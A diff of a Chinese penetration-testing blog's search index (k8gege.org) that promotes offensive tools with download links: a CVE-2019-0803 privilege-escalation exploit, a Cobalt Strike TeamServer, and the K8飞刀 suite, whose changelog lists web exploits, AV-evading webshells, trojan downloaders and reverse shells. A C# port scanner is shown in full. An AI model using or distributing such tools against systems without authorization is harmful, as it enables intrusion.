+        <tag>Exp</tag>
         <tag>Ladon</tag>
         <tag>0day</tag>
       </tags>
@@ -3433,9 +3433,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
+        <category>工具</category>
         <category>Exp</category>
         <category>Ladon</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -3693,8 +3693,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br><br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe<br></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>Kali</category>
       </categories>
       <tags>
@@ -3731,8 +3731,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p>源码为单纯检测端口是否开放，有需要大家可自行定制功能。<br>当然可以使用PortScan模块扫描开放端口带服务和Web识别。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">&#x2F;&#x2F;Ladon PortScan Moudle</span><br><span class="line">namespace LadonDLL</span><br><span class="line">&#123;</span><br><span class="line">    public class scan</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run(string ip)</span><br><span class="line">        &#123;</span><br><span class="line">            if (string.IsNullOrEmpty(ip))</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (K8CheckPort(ip, 21))</span><br><span class="line">                    Console.Write(ip + &quot;\t21 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 80))</span><br><span class="line">                    Console.Write(ip + &quot;\t80 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 1433))</span><br><span class="line">                    Console.Write(ip + &quot;\t1433 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 3306))</span><br><span class="line">                    Console.Write(ip + &quot;\t3306 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 1521))</span><br><span class="line">                    Console.Write(ip + &quot;\t1521 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 3389))</span><br><span class="line">                    Console.Write(ip + &quot;\t3389 Open\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static bool K8CheckPort(string ip, int Port)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;int Port &#x3D; 21;</span><br><span class="line">            IPAddress scanip &#x3D; IPAddress.Parse(ip);</span><br><span class="line">            IPEndPoint point &#x3D; new IPEndPoint(scanip, Port);</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                TcpClient tcp &#x3D; new TcpClient();</span><br><span class="line">                tcp.Connect(point);</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\t&quot; + Port + &quot;\tOpen&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\t&quot; + Port + &quot;\tClose&quot;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>.NET</category>
         <category>源码</category>
         <category>编程</category>
@@ -3797,6 +3797,26 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       </tags>
   </entry>
   <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0803提权工具</title>
     <url>/p/fa25cc9b.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x000 漏洞信息</strong></span><br>CVE-2019-0803 | Win32k 特权提升漏洞<br>发布时间: 2019-04-09<br>当 Win32k 组件无法正确处理内存中的对象时，Windows 中存在特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式中运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。<br>若要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
@@ -3857,49 +3877,13 @@ Microsoft Windows 10 for 32-bit Systems 0
 
 <pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
       <categories>
+        <category>工具</category>
         <category>提权</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Tool</tag>
+        <tag>Exp</tag>
         <tag>LPE</tag>
-        <tag>Exp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>K8飞刀Final</title>
-    <url>/p/de1a82bb.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/k8fly/k8fly.png"></p>
-<p><strong>法律声明:</strong> 工具仅供安全研究或授权渗透，非法用途后果自负。<br><br><strong>工具:</strong> K8飞刀Final<br><strong>作者:</strong> K8哥哥<br><strong>博客:</strong> https://www.cnblogs.com/k8gege<br><strong>简介:</strong> 一款多功能网络安全渗透测试工具(Hacker Swiss Army Knife)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.漏洞利用：&nbsp;&nbsp; 已集成20个主流WEB、CMS程序,累计115个EXP（如Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.后台扫描：&nbsp;&nbsp; 后台管理、登陆地址、木马地址、数据等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3.域名扫描：&nbsp;&nbsp; 子域名扫描、二级域名扫描、WP用户扫描<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.黑客浏览器： 自动检测SQL注入、比FireFox扩展HackBar更强更全的HTTP参数提交(见EXP调式)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.EXP 调式：&nbsp;&nbsp; 支持Get/Post/Cookie/UserAgent/Referer/X-Forwarded-For/Client-IP/VIA提交&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6.生成 EXP：&nbsp;&nbsp; 可将调式好的EXP生成工具，无需编程功底即可实现EXP或直接加入飞刀漏洞利用库<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7.加密算法：&nbsp;&nbsp; MD5(16)、MD5(32)、SHA1、SHA256、SHA384、SHA512&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8.加密解密：&nbsp;&nbsp; Base32、Base64、Base64(SHA1)支持批量加密解密、DeDe密码、VNC密码、进制转换<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9.编码转换：&nbsp;&nbsp; Hex(16进制)、URL编码、ASCII码、ASCII码转其它、Unicode转ANSI、ANSI转Unicode&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.文件转换：&nbsp; Hex2File、Hex2Bin、Bin2Hex、File2Hex（可读取任意文件比如EXE或Shellcode）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11.SQL编码：&nbsp;&nbsp; SQL注入专用CHAR以及HEX路径转换(MSSQL、Mysql、Oracle等数据库)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 12.XSS编码：&nbsp;&nbsp; JS_HEX、JS_Unicode、JS_Escape、FromCharCode、HTML实体加密解密<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13.Shell管理： 支持7种WebShell(ASP/PHP/JSP/ASPX/CFM/PYTHON/PERL)，多协议连接(仅CMD)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 14.CookieHK：&nbsp; 读取当前登陆站点Cookie(支持httponly)、可使用Cookie直接登陆后台<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15.WebShell：&nbsp; 内置飞刀专用一句话(UA或其它格式一句话可过大量杀软及WAF防火墙)&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16.Hacking：&nbsp;&nbsp; VBS随机加密免杀、GetShell、0day网马、硬件BadUSB(Teensy下载者)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17.脱库工具：&nbsp; 注入点脱库工具、支持自定义关键字或正则提取数据、可采集URL<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18.GoogleHK：&nbsp; 批量抓取URL、批量检测注入、批量GetShell、批量执行自定义EXP<br><br><strong>最终版</strong>：由于加密硬盘损坏部分飞刀等工具源码无法恢复,2017年底已无法更新飞刀主程序,但很多功能长期可用,漏洞利用库可加EXP<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 朋友们不用再问我要最新版了,没发现我已经差不2两年没更新了，和2012年的一个工具一样,不是我不更新,而是无法更新了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 加密的源码损坏某个地方，就会导致整个文件无法解密，何况经过两层加密（一层硬盘加密，一层源码加密，源码外还有TC）</p>
-<p><strong>下载地址：</strong><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8%E9%A3%9E%E5%88%80Final.rar</a></p>
-<p><strong>思维导图:</strong>&nbsp; <a href="https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png" target="_blank">https://raw.githubusercontent.com/k8gege/K8tools/master/K8%E9%A3%9E%E5%88%80Final.png</a></p>
-<p><strong>更新历史</strong><br>=================================================================================<br>K8飞刀 20170920<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VNC密码加密解密（RealVNC、Tightvnc等)&nbsp;&nbsp;&nbsp;&nbsp; 20170920<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(下载文件到服务器命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170426<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASPX UA CmdShell(UA Aspx一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ASP&nbsp; UA CmdShell(UA Asp一句话CMD连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 历史执行命令(文本下拉框&amp;上下方向键控制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170422<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64(SHA1)批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base32--批量加密解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20170120<br>K8飞刀 20160613<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Hex)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--XSS跨站--HTML实体编码(Dec)解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160612<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2PleskHex(Plesk密码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2RegHex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--RegHex2Hex(注册表Hex)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Hex编码--Hex2File(Hex转Bin文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160610<br>=================================================================================<br>K8飞刀 20160514<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell--ImageMagick命令执行EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160514<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--计算机存储单位换算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160505<br>=================================================================================<br>K8飞刀 20160414<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 漏洞利用库EXP 支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160413<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 生成EXE漏洞EXP支持(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2Bin(Hex转文件含空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Hex2File(Hex转文件非空格)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion JRun LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7b LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 7a LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 6 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion 8 LFI EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键查看EXP漏洞库列表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--浏览器--URL右键另存为&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160304<br>=================================================================================<br>K8飞刀 20160302<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Base64编码--Base64批量解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160302<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码字典&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串用户密码提取&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--正则忽略大小写字符串生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160301<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--数据处理--MSSQL连接字符串(Web.config)&nbsp;&nbsp;&nbsp;&nbsp; 20160229<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--菜刀配置数据库代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160626<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code/代码--C#属性代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160223<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UserAgent--WebShell一句话测试(ASPX/PHP/ASP)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160203<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--字符串处理--拼接\倒序\拼接注释免杀&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160202<br>=================================================================================<br>K8飞刀 20160115<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码纠正--处理从网页复制的ASPX代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160115<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转CMD写入文件(命令行-可执行命令)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--代码转BAT写入文件(批处理-可上传文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--File2Hex文件转16进制(空格)&nbsp;&nbsp;&nbsp;&nbsp; 20160108<br>=================================================================================<br>K8飞刀 20151218<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Joomla GetShell EXP&nbsp;&nbsp;&nbsp; 20151216<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Jboss&nbsp; GetShell EXP&nbsp;&nbsp;&nbsp; 20151216<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客--Hacking--批量执行Sqlmap 检测注入点&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151216<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动更新显示详细更新内容(让用户了解最新版功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151215<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--Hacking--批量执行自定义EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151208<br>[u]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 大型站点子域名扫描/大型站点子域名收集结果更准确&nbsp;&nbsp;&nbsp;&nbsp; 20151203<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows &amp; Linux渗透常用命令 &amp; NC反弹一键编译&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151126<br>=================================================================================<br>K8飞刀 20151120<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--PHP木马--UA一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shell文件管理--右键菜单--保存目录结构信息&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151118<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式 调用SQLMAP检测页面URL是否存在注入&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XAMPP &lt;=1.6.8&nbsp; 1.7.1 1.8.2 SQL注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20151015<br>=================================================================================<br>K8飞刀 2015国庆版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--Word远程代码执行MS15-022&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--WinRAR自解压远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150929<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--MS13-071主题远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150924<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VBS脚本--VBS下载者(http木马地址)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150920<br>=================================================================================<br>K8飞刀 20150911<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Mysql Inject OutFile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150909<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话 修改时间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 